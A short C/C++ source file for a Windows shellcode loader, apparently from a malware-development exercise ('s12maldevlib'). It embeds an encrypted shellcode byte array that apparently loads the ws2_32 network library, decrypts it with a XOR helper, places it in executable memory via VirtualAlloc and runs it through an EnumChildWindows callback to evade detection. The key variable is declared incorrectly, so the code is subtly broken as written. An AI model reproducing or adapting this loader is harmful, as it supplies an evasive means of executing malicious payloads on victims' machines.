#include <windows.h>
#include <stdio.h>
#include "Shellcode.h"

int main(){
    unsigned char shellcode[] = "\xf6\x42\x89\xee\xfa\xe2\xca\xa\xa\xa\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x5\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x8\x26\x2a\x4b\xcb\xc3\x7\x4b\xb\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\xb\xda\x81\x8a\x82\xa\xa\xa\x42\x8f\xca\x7e\x6d\x42\xb\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\xb\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\xb\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x7\x4b\xb\xcb\x32\xea\x7f\xfb\x46\x9\x46\x2e\x2\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\xb\xda\x6c\x4b\x81\x6\x42\x4e\x81\x4a\x16\x43\xb\xda\x4b\x81\xe\x82\x42\xb\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x5d\xf5\xf5\xf5\x57\x43\xb4\x7d\x79\x38\x55\x39\x38\xa\xa\x4b\x5c\x43\x83\xec\x42\x8b\xe6\xaa\xb\xa\xa\x43\x83\xef\x43\xb6\x8\xa\xe\xb7\xca\xa2\xa\x8d\x4b\x5e\x43\x83\xee\x46\x83\xfb\x4b\xb0\x46\x7d\x2c\xd\xf5\xdf\x46\x83\xe0\x62\xb\xb\xa\xa\x53\x4b\xb0\x23\x8a\x61\xa\xf5\xdf\x5a\x5a\x47\x3b\xc3\x47\x3b\xca\x42\xf5\xca\x42\x83\xc8\x42\xf5\xca\x42\x83\xcb\x4b\xb0\xe0\x5\xd5\xea\xf5\xdf\x42\x83\xcd\x60\x1a\x4b\x52\x46\x83\xe8\x42\x83\xf3\x4b\xb0\x93\xaf\x7e\x6b\xf5\xdf\x42\x8b\xce\x4a\x8\xa\xa\x43\xb2\x69\x67\x6e\xa\xa\xa\xa\xa\x4b\x5a\x4b\x5a\x42\x83\xe8\x5d\x5d\x5d\x47\x3b\xca\x60\x7\x53\x4b\x5a\xe8\xf6\x6c\xcd\x4e\x2e\x5e\xb\xb\x42\x87\x4e\x2e\x12\xcc\xa\x62\x42\x83\xec\x5c\x5a\x4b\x5a\x4b\x5a\x4b\x5a\x43\xf5\xca\x4b\x5a\x43\xf5\xc2\x47\x83\xcb\x46\x83\xcb\x4b\xb0\x73\xc6\x35\x8c\xf5\xdf\x42\x3b\xd8\x42\xf5\xc0\x81\x4\x4b\xb0\x2\x8d\x17\x6a\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x4b\xb0\xac\x9f\xb7\x97\xf5\xdf\x42\x89\xce\x22\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x53\x4b\x83\xd0\xf5\xdf\xa";

    unsigned char key = "s12maldevlib";
    int len = sizeof(shellcode);

    Shellcode sc(shellcode,len);

    unsigned char * decrypted = sc.XOR_decrypt(key);
 

    HANDLE hAlloc = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, decrypted, len);
    EnumChildWindows((HWND) NULL, (WNDENUMPROC) hAlloc, NULL);

    return 0;
}
